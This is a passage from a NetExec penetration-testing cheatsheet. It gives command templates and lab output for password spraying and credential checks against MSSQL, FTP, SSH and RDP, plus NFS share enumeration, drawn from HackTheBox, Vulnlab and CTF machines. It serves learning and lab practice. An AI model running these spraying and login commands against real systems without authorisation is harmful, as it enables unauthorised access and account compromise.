MSSQL       10.10.162.37    1433   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:reflection.vl)
MSSQL       10.10.162.37    1433   DC01             [+] DC01\web_prod:Tribesman201
```

Writeup: [Reflection](https://seriotonctf.github.io/Reflection-Vulnlab/#MSSQL)

Spraying with local accounts

```
$ netexec mssql sequel.htb -u users.txt -p passwords.txt --continue-on-success --no-bruteforce --local-auth
MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [-] DC01\angela:0fwz7Q4mSpurIt99 (Login failed for user 'angela'. Please try again with or without '--local-auth')
MSSQL       10.10.11.51     1433   DC01             [-] DC01\oscar:86LxLBMgEWaKUnBG (Login failed for user 'oscar'. Please try again with or without '--local-auth')
MSSQL       10.10.11.51     1433   DC01             [-] DC01\kevin:Md9Wlq1E5bZnVDVo (Login failed for user 'kevin'. Please try again with or without '--local-auth')
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
```

Check for impersonation and other privilege escalation paths

```
netexec mssql $target -u $username -p $password -M mssql_priv
```

```
$ proxychains -q netexec mssql 172.16.41.250 -u jack.smith -p P@ssw0rd -M mssql_priv
MSSQL       172.16.41.250   1433   SQL03            [*] Windows Server 2022 Build 20348 (name:SQL03) (domain:domain.local)
MSSQL       172.16.41.250   1433   SQL03            [+] domain.local\jack.smith:P@ssw0rd
MSSQL_PRIV  172.16.41.250   1433   SQL03            [*] DOMAIN\Jack.Smith can impersonate: dev
```

### FTP

```
netexec ftp $target -u $username -p $password --ls
netexec ftp $target -u $username -p $password --ls $folder
netexec ftp $target -u $username -p $password --ls $folder --get $file
```

```
$ netexec ftp 10.10.140.38 -u ftp.txt -p ftp.txt --continue-on-success
FTP         10.10.140.38    21     10.10.140.38     [*] Banner: -FileZilla Server 1.8.0
220 Please visit https://filezilla-project.org/
FTP         10.10.140.38    21     10.10.140.38     [+] ftp:ftp
...[snip]...
FTP         10.10.140.38    21     10.10.140.38     [+] ftp:guest
...[snip]...
FTP         10.10.140.38    21     10.10.140.38     [+] ftp:anonymous
```

### SSH

`Shell access!` means the account can log in, and NetExec also tells if the user is root.

```
netexec ssh $target -u $username -p $password
netexec ssh $target -u $username -p $password --key-file id_rsa
```

```
$ netexec ssh shibuya.vl -u simon.watson@shibuya.vl -p P@ssw0rd
SSH         10.10.96.71     22     shibuya.vl       [*] SSH-2.0-OpenSSH_for_Windows_9.5
SSH         10.10.96.71     22     shibuya.vl       [+] simon.watson@shibuya.vl:P@ssw0rd  Windows - Shell access!
```

Writeup: [Shibuya](https://seriotonctf.github.io/Shibuya-Vulnlab/)

With a private key

```
$ proxychains4 -q netexec ssh 172.16.11.0/24 -u lynda.parry@domain.local -p 'P@ssw0rd' --key-file lynda.parry.key
SSH         172.16.11.71    22     172.16.11.71     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3
SSH         172.16.11.11    22     172.16.11.11     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3
SSH         172.16.11.70    22     172.16.11.70     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3
SSH         172.16.11.13    22     172.16.11.13     [*] SSH-2.0-OpenSSH_for_Windows_8.1
SSH         172.16.11.71    22     172.16.11.71     [-] lynda.parry@domain.local:P@ssw0rd
SSH         172.16.11.11    22     172.16.11.11     [-] lynda.parry@domain.local:P@ssw0rd
SSH         172.16.11.70    22     172.16.11.70     [+] lynda.parry@domain.local:P@ssw0rd (keyfile: lynda.parry.key)  Linux - Shell access!
SSH         172.16.11.13    22     172.16.11.13     [-] lynda.parry@domain.local:P@ssw0rd
SSH         172.16.11.25    22     172.16.11.25     [*] Unknown SSH Version, skipping...
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

### RDP

`(Pwn3d!)` on RDP means the account can log in over RDP.

```
netexec rdp $target -u $username -p $password
netexec rdp $target -u $username -H $hash
netexec rdp $target -u $username -p $password --local-auth
```

```
$ netexec rdp 172.16.1.36 -u ned.flanders_adm -p 'P@ssw0rd'
RDP         172.16.1.36     3389   WSADM            [*] Windows 10 or Windows Server 2016 Build 19041 (name:WSADM) (domain:domain.local) (nla:True)
RDP         172.16.1.36     3389   WSADM            [+] domain.local\ned.flanders_adm:P@ssw0rd (Pwn3d!)
```

### NFS

Lists NFS exports and who can mount them. Files can often be read with no credentials at all.

```
netexec nfs $target --shares
netexec nfs $target --enum-shares
netexec nfs $target --get-file $remote_file $local_file
```

```
$ netexec nfs 10.10.213.55 --enum-shares 0
NFS         10.10.213.55    20048  10.10.213.55     [*] Target supported NFS versions: (3, 4)
NFS         10.10.213.55    20048  10.10.213.55     [*] Enumerating NFS Shares Directories
NFS         10.10.213.55    20048  10.10.213.55     [+] /mnt/nfs_shares
NFS         10.10.213.55    20048  10.10.213.55     UID        Perms    File Size      File Path                                     Access List
NFS         10.10.213.55    20048  10.10.213.55     ---        -----    ---------      ---------                                     -----------
NFS         10.10.213.55    20048  10.10.213.55     0          r--      -              /mnt/nfs_shares/                              *
```

### Debug Output

Shows what NetExec is doing under the hood, useful when a login fails for no clear reason

```
netexec smb $target -u $username -p $password --verbose
netexec smb $target -u $username -p $password --debug
```

```
$ netexec ssh 10.10.178.166 -u ssh-users.txt -p valid-passwords.txt --continue-on-success --no-bruteforce --verbose --debug
[20:21:05] INFO     Socket info: host=10.10.178.166, hostname=10.10.178.166, kerberos=False, ipv6=False, link-local ipv6=False                                                connection.py:163
SSH         10.10.178.166   22     10.10.178.166    [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6
[20:21:10] INFO     Determined user is root via `id; sudo -ln` command                                                                                                                ssh.py:86
SSH         10.10.178.166   22     10.10.178.166    [+] svc_auditreporter@vigilant.vl:DeVeLoPeR712  Linux - Shell access!
SSH         10.10.178.166   22     10.10.178.166    [+] Pamela.Clark@vigilant.vl:Vigilant@Tech2024  Network Devices
SSH         10.10.178.166   22     10.10.178.166    [-] Alex.Powell@vigilant.vl:Vigilant_Market2024
SSH         10.10.178.166   22     10.10.178.166    [-] Edwin.Dixon@vigilant.vl:Vigilant_Finance$
SSH         10.10.178.166   22     10.10.178.166    [-] Daniel.Washington@vigilant.vl:Vigilant&Strategy!
```

## Resources
- https://www.netexec.wiki/
- https://www.rayanle.cat/lehack-2024-netexec-workshop-writeup/

## Practice
Machines used for the examples in this cheatsheet:

- **HackTheBox:** Absolute, [Cicada](https://seriotonctf.github.io/HTB-Solving-Cicada-Using-Only-NetExec/), DarkCorp, DarkZero, EscapeTwo, Freelancer, Haze, Infiltrator, Mist, PingPong, Pirate, Puppy, Rebound, RustyKey, StreamIO, TheFrizz, Voleur
- **Vulnlab:** Baby2, Cicada, Delegate, Heron, Intercept, Kaiju, Klendathu, Lustrous, [Phantom](https://seriotonctf.github.io/Phantom-Vulnlab/), Puppet, Push, [Redelegate](https://seriotonctf.github.io/Redelegate-Vulnlab/), [Reflection](https://seriotonctf.github.io/Reflection-Vulnlab/), [Shibuya](https://seriotonctf.github.io/Shibuya-Vulnlab/), Vigilant
- **CTF:** [AKTIVKATALOG](https://seriotonctf.github.io/AKTIVKATALOG-1-Hack-lu-CTF-2025/) (Hack.lu CTF 2025)
- **NetExec Lab:** https://github.com/Pennyw0rth/NetExec-Lab
